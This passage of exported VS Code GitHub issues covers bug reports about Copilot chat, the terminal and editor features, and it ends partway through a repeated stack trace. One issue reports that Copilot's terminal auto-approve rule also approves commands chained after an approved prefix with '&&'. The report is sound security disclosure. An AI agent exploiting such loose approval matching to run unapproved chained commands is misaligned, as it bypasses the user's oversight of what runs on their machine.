downward arrow I get in other file types when there's an NES below my current viewport:\n\n<img width=\"1368\" height=\"348\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/8e38a191-1819-4add-9ff6-d80c941db521\" />"}, {"author": "DonJayamanne", "body": "@bamurtaugh Just an update, this is an existing issue with NES but specific to Notebooks. I'm looking into this, unlikely I'll land a fix in the release. Very interesting bug, caused by a long standing bug/debt item in Notebooks.\n\n@rebornix I am looking into this today, not sure I can get this fixed in time.\nGiven this issue has existed for a while (ie. its not specific to the new NES work in notebook).\nIts caused by the fact that we render lines in the Monaco Editor outside the view port (i.e. in previous example the editor is the size of viewport, however editor is scroll out of view, thus editor thinks lines are still visible hence NES is rendered below viewport).\nFix is to ensure editor doesn't scroll beyond viewport, by resizing it as we scroll (this requires careful thought and implementation)"}]}
{"repo": "microsoft/vscode", "issue_number": 265579, "issue_url": "https://github.com/microsoft/vscode/issues/265579", "issue_title": "can't close the inline chat", "issue_author": "bvanderwood", "issue_body": "\nType: <b>Bug</b>\n\nClicking close on the inline chat does nothing\n\nExtension version: 0.30.3\nVS Code version: Code 1.103.2 (6f17636121051a53c88d3e605c491d22af2ba755, 2025-08-20T16:45:34.255Z)\nOS version: Windows_NT x64 10.0.26120\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|AMD Ryzen 9 7950X3D 16-Core Processor           (16 x 4192)|\n|GPU Status|2d_canvas: enabled<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: disabled_off<br>trees_in_viz: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>vulkan: disabled_off<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|undefined|\n|Memory (System)|63.15GB (29.52GB free)|\n|Process Argv|--crash-reporter-id af520104-7ff5-4028-bf37-7218b9b75d90|\n|Screen Reader|no|\n|VM|0%|\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368cf:30146710\nbinariesv615:30325510\nnativeloc1:31344060\ndwcopilot:31170013\ndwoutputs:31242946\ncopilot_t_ci:31333650\ne5gg6876:31282496\n996jf627:31283433\npythonrdcb7:31342333\nusemplatestapi:31297334\n747dc170:31275177\naj953862:31281341\nnesew2to5:31336538\nagentclaude:31374413\nnes-set-on:31340697\ntestaa123cf:31335227\n63221493:31336333\n0927b901:31350571\n45650338:31358607\n0cj2b977:31352657\npylancealldocsf:31379511\ngemagent1:31368469\ncloudbuttont:31379625\nretryenabled:31370050\n3efgi100_wstrepl:31374188\ntrigger-command-fix:31379601\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "insiders-released", "inline-chat"], "comments": [{"author": "taauntik", "body": "@bvanderwood I've tried with the same version and it seems to be working fine! What are the exact steps that needs to be followed?\n\nhttps://github.com/user-attachments/assets/17fcbaed-cf47-41dc-8b56-0117f9af2c1f"}, {"author": "bvanderwood", "body": "Notably it was _after_ asking it something:\n\nhttps://github.com/user-attachments/assets/9a7c9057-44e9-4149-9866-da0c5e90414f\n\n"}]}
{"repo": "microsoft/vscode", "issue_number": 267669, "issue_url": "https://github.com/microsoft/vscode/issues/267669", "issue_title": "Auto-approve rules are too loose", "issue_author": "kylegrover", "issue_body": "It seems like \"Always allow exact command line\" allows a lot more than the exact command line. I noticed this just now:\n\n<img width=\"279\" height=\"84\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/701071fb-7b97-4c67-900d-8271d2b5500e\" />\n\nClicking through to my config it contains:\n```json\n  \"npm run build\": {\n      \"approve\": true,\n      \"matchCommandLine\": true\n  }\n```\n\nIf I'm reading this correctly, copilot could do anything in the world after that && and it would automatically run.\nPossible solutions: strict line matching as an option (Always allow exact command line vs Always allow exact command vs Always allow command), or split commands by logical seperators like &&, and require that each part is approved before running. \n\n- Copilot Chat Extension Version: latest\n- VS Code Version: latest\n- OS Version: Win 11 latest\n- Feature (e.g. agent/edit/ask mode): Agent\n- Selected model (e.g. GPT 4.1, Claude 3.7 Sonnet): Any / GPT-5\n\nSteps to Reproduce:\n\n1. \"Always allow exact command\" on a copilot command\n2. Later, have copilot run that command followed by && and another command\n", "issue_labels": ["bug", "insiders-released", "chat-terminal"], "comments": [{"author": "kylegrover", "body": "<img width=\"278\" height=\"170\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/6e1c687b-ac5b-4600-8b55-c3e51819596c\" />\n\nThis looks like it is doing multiple parsing with `|` or `||`, but clicking through I don't see these in my auto-approve settings, I suppose they're default: true? The @id:chat.tools.terminal.autoApprove text says that both sides of the && should require approval as well, so maybe my initial interaction was a bug?"}, {"author": "Tyriar", "body": "You're matching the _command line_ here, as opposed to sub-commands within the command line:\n\n```\n  \"npm run build\": {\n      \"approve\": true,\n      \"matchCommandLine\": true\n  }\n```\n\nThat means that if the command line (`npm run build && <whatever>`) starts with `npm run build`, it will be auto approved. Don't set `matchCommandLine` and you'll get the behavior you want."}, {"author": "kylegrover", "body": "I'm still confused by this, I didn't actually edit the json. Was this a result of pressing \"Always Allow Exact Command Line\" instead of \"Always Allow Command\"? Ie does choosing the option with \"Exact\" in it make the matching less exact?"}, {"author": "Tyriar", "body": "You're right there is a bug here, fix coming soon"}]}
{"repo": "microsoft/vscode", "issue_number": 268595, "issue_url": "https://github.com/microsoft/vscode/issues/268595", "issue_title": "Terminal tool suggests to send the \"any key\"", "issue_author": "roblourens", "issue_body": "```\n *  Executing task: npm run build \n\nsource /Users/roblou/code/debugtest/.venv/bin/activate\nnpm error Missing script: \"build\"\nnpm error\nnpm error To see a list of scripts, run:\nnpm error   npm run\nnpm error A complete log of this run can be found in: /Users/roblou/.npm/_logs/2025-09-27T01_33_30_232Z-debug-0.log\n\n *  The terminal process \"/bin/zsh '-l', '-c', 'npm run build'\" terminated with exit code: 1. \n *  Terminal will be reused by tasks, press any key to close it. \n```\n\nAlso the way this message is constructed seems odd\n<img width=\"473\" height=\"154\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/fa7e6dcc-c11d-43f5-98dc-95d8544cc9e9\" />\n\n\n[copilotLanguageModelWrapper_8887775b.copilotmd](https://github.com/user-attachments/files/22569953/copilotLanguageModelWrapper_8887775b.copilotmd)\n[copilotLanguageModelWrapper_815426d6.copilotmd](https://github.com/user-attachments/files/22569954/copilotLanguageModelWrapper_815426d6.copilotmd)", "issue_labels": ["bug", "tasks", "insiders-released", "chat-agent"], "comments": [{"author": "roblourens", "body": "I added this task for this script\n```\n\t\t{\n\t\t\t\"label\": \"press-any-key\",\n\t\t\t\"type\": \"shell\",\n\t\t\t\"command\": \"${workspaceFolder}/press_any_key.sh\",\n\t\t\t\"problemMatcher\": []\n\t\t}\n```\n\n```\n#!/bin/bash\n\necho \"Press any key to continue...\"\nread -n 1 -s\necho \"Continuing...\"\n```\n\nand got this \n\n<img width=\"483\" height=\"184\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/82b72a03-f583-4bd8-aadf-f10995d54f96\" />\n\n[5aaa7bbc.copilotmd](https://github.com/user-attachments/files/22627302/5aaa7bbc.copilotmd)\n[88364408.copilotmd](https://github.com/user-attachments/files/22627304/88364408.copilotmd)\n[panel_editAgent_540f8206.copilotmd](https://github.com/user-attachments/files/22627303/panel_editAgent_540f8206.copilotmd)\n\nBut the thing is, I see your prompt change and I was trying to set up a situation where we wouldn't want to ignore 'any key'. Here wouldn't you want it to press some key to continue running the task?"}]}
{"repo": "microsoft/vscode", "issue_number": 269730, "issue_url": "https://github.com/microsoft/vscode/issues/269730", "issue_title": "right prompts can be detected as ghost text", "issue_author": "meganrogge", "issue_body": "This is really a problem since we then present the ghost text suggestion first \ud83e\udee0 \n\n<img width=\"774\" height=\"311\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/d88800ee-4305-4fb5-8865-31c1b3e25699\" />", "issue_labels": ["bug", "insiders-released", "terminal-suggest"], "comments": [{"author": "meganrogge", "body": "fyi @Tyriar "}]}
{"repo": "microsoft/vscode", "issue_number": 270609, "issue_url": "https://github.com/microsoft/vscode/issues/270609", "issue_title": "Copilot terminals does not load the same profile as normal terminals do", "issue_author": "bryanchen-d", "issue_body": "\nType: <b>Bug</b>\n\nI have nvm installed on .zprofile. The nodejs commands work well on a normal terminals, however copilot terminals keep failing to find the nodejs command when the copilot agent launched them to do the same commands.\n\nThe discrepancy is that the copilot terminals use `zsh -i` unless the normal terminals use `zsh -il`.\n\nVS Code version: Code - Insiders 1.105.0-insider (Universal) (03c265b1adee71ac88f833e065f7bb956b60550a, 2025-10-08T14:07:41.558Z)\nOS version: Darwin arm64 25.0.0\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|Apple M1 Pro (8 x 2400)|\n|GPU Status|2d_canvas: enabled<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: enabled_on<br>trees_in_viz: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|8, 10, 14|\n|Memory (System)|16.00GB (0.23GB free)|\n|Process Argv|. --crash-reporter-id d2329c78-39f2-401c-96bd-afc18cc51c9b|\n|Screen Reader|no|\n|VM|0%|\n</details><details><summary>Extensions (19)</summary>\n\nExtension|Author (truncated)|Version\n---|---|---\nvscode-eslint|dba|3.0.16\ngitlens|eam|17.6.1\nprettier-vscode|esb|11.0.0\ncopilot|Git|1.378.1798\ncopilot-chat|Git|0.32.2025100703\nvscode-pull-request-github|Git|0.118.2\nvscode-azure-github-copilot|ms-|1.0.117\nvscode-azure-mcp-server|ms-|0.8.5\nvscode-azureresourcegroups|ms-|0.11.4\ndebugpy|ms-|2025.10.0\npython|ms-|2025.14.0\nvscode-pylance|ms-|2025.8.3\nvscode-python-envs|ms-|1.8.0\nremote-containers|ms-|0.429.0\nextension-test-runner|ms-|0.0.12\nvscode-github-issue-notebooks|ms-|0.0.133\nnative-preview|Typ|0.20251009.1\nvscode-selfhost-test-provider|ms-|0.4.0\nvscode-selfhost-import-aid|ms-|0.0.1\n\n\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368cf:30146710\npythonvspyt551cf:31249598\ncmp-cht-unified-ctrl3:31396547\nnativeloc1:31118317\ndwcopilot:31158714\n471b6256:31240254\ndwoutputs:31242946\ncopilot_t_ci:31333650\ng012b348:31231168\n6gi0g917:31259950\npythonrdcb7:31268811\nusemplatestapi:31297334\n6518g693:31302842\n0g1h6703:31329154\ncs4_fixed:31398790\n6abeh943:31336334\nenvsactivate1:31349248\novs_pri_t:31398872\neditstats-enabled:31346256\naa_c:31379597\ncloudbuttont:31366566\nqwen_all_req:31396049\nmultireplacestring:31382717\nnb255704_tf:31377673\n3efgi100_wstrepl:31382709\nge3cd652:31390471\ntrigger-command-fix:31379601\nauto_model_enabled:31396818\ngrok-control-prompt:31384642\nuse-responses-api:31390341\ncopilot-gpt-5-mini:31396488\nc91a3477:31396429\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "insiders-released", "terminal-shell-zsh", "chat-terminal"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 270668, "issue_url": "https://github.com/microsoft/vscode/issues/270668", "issue_title": "Insert in Terminal fails if the terminal command contains a comment", "issue_author": "pierceboggan", "issue_body": "<img width=\"676\" height=\"205\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/691605dc-68fb-45f0-8375-ef0af6d77da5\" />\n\nIMHO, it should ignore the comment and only insert the command", "issue_labels": ["bug", "terminal", "insiders-released", "chat"], "comments": [{"author": "meganrogge", "body": "Where the text that we run is coming from:\n\nhttps://github.com/microsoft/vscode/blob/50458e39a26afb8bc7a4f795cd2305adaa19fbca/src/vs/workbench/contrib/chat/browser/codeBlockPart.ts#L496"}]}
{"repo": "microsoft/vscode", "issue_number": 270736, "issue_url": "https://github.com/microsoft/vscode/issues/270736", "issue_title": "Auto approve rule added links aren't working", "issue_author": "Tyriar", "issue_body": "<img width=\"409\" height=\"808\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/ed873ae6-b7df-4eea-9c35-5f22e82011ca\" />", "issue_labels": ["bug", "insiders-released", "chat-terminal"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 270952, "issue_url": "https://github.com/microsoft/vscode/issues/270952", "issue_title": "chat empty state \"plan\" is the only thing that has a blue border on hover", "issue_author": "justschen", "issue_body": "https://github.com/user-attachments/assets/89fd3b5a-47ad-4927-88ed-443e96f93b49\n\ni think this is kind of strange. we should just use the regular hover and only have border on `focus`, not `hover`", "issue_labels": ["bug", "ux", "insiders-released"], "comments": [{"author": "justschen", "body": "fixing it here: https://github.com/microsoft/vscode/issues/270952"}]}
{"repo": "microsoft/vscode", "issue_number": 262646, "issue_url": "https://github.com/microsoft/vscode/issues/262646", "issue_title": "Models provided by custom LanguageModelChatProvider doesn't show up when open model selector for the second time", "issue_author": "a1exwang", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! bug_report_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- \ud83d\udd6e Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->\n<!-- \ud83d\udd0e Search existing issues to avoid creating duplicates. -->\n<!-- \ud83e\uddea Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->\n<!-- \ud83d\udca1 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->\n<!-- \ud83d\udd27 Launch with `code --disable-extensions` to check. -->\nDoes this issue occur when all extensions are disabled?: n/a\n\n<!-- \ud83e\ude93 If you answered No above, use 'Help: Start Extension Bisect' from Command Palette to try to identify the cause. -->\n<!-- \ud83d\udce3 Issues caused by an extension need to be reported directly to the extension publisher. The 'Help > Report Issue' dialog can assist with this. -->\nVersion: 1.104.0-insider (user setup)\nCommit: d2edee24762a3923e2422d3f61528ae4b1381a33\nDate: 2025-08-20T06:50:12.030Z\nElectron: 37.2.3\nElectronBuildId: 12035395\nChromium: 138.0.7204.100\nNode.js: 22.17.0\nV8: 13.8.500258-electron.0\nOS: Windows_NT x64 10.0.26100\n\nSteps to Reproduce:\n\n1. Implement a custom LanguageModelChatProvider\n2. Add a custom model via the GitHub Copilot Chat model selector\n\n<img width=\"542\" height=\"520\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/4553f70d-66d8-4d0b-9e49-f777ae827506\" />\n\n3. Reload vscode but don't clicking anything that can cause my extension to activate.\n4. Open GitHub Copilot Chat model selector. My custom models are gone\n\n<img width=\"763\" height=\"954\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/75b774bc-3d9b-4bf3-825b-1e7912b3ee45\" />\n\nExpected behavior:\nMy custom models can show up in the list and when selecting that model or start to chat with the model, my extension can be activated.\n\n\nNote: After I manually activate my extension, the models can show up in the list correctly.", "issue_labels": ["bug", "verified", "insiders-released", "model-byok"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 263568, "issue_url": "https://github.com/microsoft/vscode/issues/263568", "issue_title": "Error \"Failed to fetch MCP registry URL\" in dev console", "issue_author": "ulugbekna", "issue_body": "\nType: <b>Bug</b>\n\nThis line seems to be throwing - https://github.com/microsoft/vscode/blob/d793cce20e8a5ed7a04d603c20913eb0fe66c07f/src/vs/workbench/services/accounts/common/defaultAccount.ts#L310\n\n<img width=\"1484\" height=\"724\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/586a0ae2-cd66-4bd4-ae67-14e6592b49d9\" />\n\nVS Code version: Code - Insiders 1.104.0-insider (4a31639f5f6e1ba6f2521ca73430f3d59eb97524, 2025-08-27T07:48:03.836Z)\nOS version: Darwin arm64 24.6.0\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|Apple M1 Pro (8 x 2400)|\n|GPU Status|2d_canvas: enabled<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: enabled_on<br>trees_in_viz: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|11, 19, 18|\n|Memory (System)|32.00GB (0.34GB free)|\n|Process Argv|--log info --log github.vscode-pull-request-github=debug --log github.copilot-chat=trace --crash-reporter-id 3184aec0-4b31-4764-bfb0-162155975430|\n|Screen Reader|no|\n|VM|0%|\n</details><details><summary>Extensions (75)</summary>\n\nExtension|Author (truncated)|Version\n---|---|---\nBookmarks|ale|13.5.0\ntsl-problem-matcher|amo|0.6.2\nmarkdown-mermaid|bie|1.28.0\nnpm-intellisense|chr|1.4.5\nesbuild-problem-matchers|con|0.0.3\nvscode-eslint|dba|3.0.16\nkusto|don|0.5.4\ntypescript-notebook|don|2.0.6\ngitlens|eam|2025.8.2705\nEditorConfig|Edi|0.17.4\nprettier-vscode|esb|11.0.0\ncodespaces|Git|1.17.3\ncopilot|Git|1.362.1760\ncopilot-chat|Git|0.31.2025082602\nremotehub|Git|0.65.2025081801\nvscode-pull-request-github|Git|0.117.2025082708\ngo|gol|0.48.0\ngc-excelviewer|Gra|4.2.64\nhediet-power-tools|hed|0.4.0\nvscode-drawio|hed|1.9.250226013\nvscode-postfix-ts|ipa|1.13.2\nmdl-ext|you|0.0.1\nrainbow-csv|mec|3.20.0\ntemplate-string-converter|meg|0.6.1\nvscode-azureresourcegroups|ms-|0.11.1\nvscode-containers|ms-|2.1.0\nvscode-docker|ms-|2.0.0\ndebugpy|ms-|2025.11.2025072901\npython|ms-|2025.13.2025082601\nvscode-pylance|ms-|2025.7.102\njupyter|ms-|2025.8.2025082701\njupyter-keymap|ms-|1.1.2\njupyter-renderers|ms-|1.3.2025062701\nvscode-jupyter-cell-tags|ms-|0.1.9\nvscode-jupyter-slideshow|ms-|0.1.6\nremote-ssh|ms-|0.121.2025081515\nremote-ssh-edit|ms-|0.87.0\nremote-wsl|ms-|0.104.1\nazure-repos|ms-|0.41.2025081801\ncpptools|ms-|1.26.3\ndebug-value-editor|ms-|0.2.2\nextension-test-runner|ms-|0.0.12\nhexeditor|ms-|1.11.1\njs-debug-nightly|ms-|2025.8.2017\nremote-explorer|ms-|0.6.2025081809\nremote-repositories|ms-|0.43.2025081801\nremote-server|ms-|1.6.2025081809\nsimulation-test-runner|ms-|0.0.4\ntest-adapter-converter|ms-|0.2.1\nts-file-path-support|ms-|1.0.0\nvscode-diagnostic-tools|ms-|1.2.0\nvscode-github-issue-notebooks|ms-|0.0.133\nvscode-js-profile-flame|ms-|1.0.9\nvscode-speech|ms-|0.16.0\nvscode-typescript-next|ms-|6.0.20250825\nwasm-dwarf-debugging|ms-|1.0.1\nweb-editors|ms-|0.3.0\nocaml-platform|oca|1.32.0\nrefactor|p42|3.0.1\ndeoptexplorer-vscode|rbu|1.1.2\ntoggle|reb|0.0.2\nvscode-xml|red|0.29.2025081108\nvscode-yaml|red|1.18.0\nLiveServer|rit|5.7.9\nrust-analyzer|rus|0.3.2593\nsvg-preview|Sim|2.8.3\ngraphviz-interactive-preview|tin|0.3.5\ntldraw-vscode|tld|2.117.0\njson-string-viewer|Ulu|0.0.3\nerrorlens|use|3.26.0\nexplorer|vit|1.28.2\nvim|vsc|1.30.1\nvscode-alternate-file|wil|0.3.1\npretty-ts-errors|Yoa|0.6.1\nmarkdown-all-in-one|yzh|3.6.3\n\n\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368:30146709\npythonvspyt551cf:31249598\nvscrp:30624060\nnativeloc1:31118317\ndwcopilot:31158714\ndwoutputs:31242946\ncopilot_t_ci:31333650\ng012b348:31231168\npythoneinst12:31251391\n6gi0g917:31259950\n996jf627:31264550\npythonrdcb7:31268811\nusemplatestapi:31297334\n747dc170:31275146\npythonpcpt1:31345880\n6518g693:31302842\n9d2cg352:31346308\nj97ad248:31349650\n0g1h6703:31329154\nagentisdefault:31374427\n6abeh943:31336334\nenvsactivate1:31349248\n0927b901:31340060\ncustommodelcf:31371783\neditstats-enabled:31346256\njusteven_python:31371804\ngendocstringt:31371829\ncloudbuttont:31366566\naihoversummaries_t:31371858\ntodos-1:31366868\ncodex-prompt:31370221\nsearch_len1:31370369\nnb255704_tf:31375616\n3efgi100_wstrepl:31374188\nnes-auto-off:31375600\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "verified", "insiders-released"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 263803, "issue_url": "https://github.com/microsoft/vscode/issues/263803", "issue_title": "Rate Limit / Maximum call stack size exceeded in Copilot Chat 0.31.2025082801", "issue_author": "alexdima", "issue_body": "In the latest chat extension, type \"Hello\" in any more and observe in developer tools:\n```\nstack trace: RangeError: Maximum call stack size exceeded\n    at new LF (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:226)\n    at Zg._event [as onDidFinishInitialization] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:1534)\n    at /Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1048:19458\n    at new Promise (<anonymous>)\n    at /Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1048:19426\n    at xb (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:77601)\n    at new Ow (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1048:19164)\n    at t._createInstance (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:456:2146)\n    at t.createInstance (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:456:1586)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15863)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at 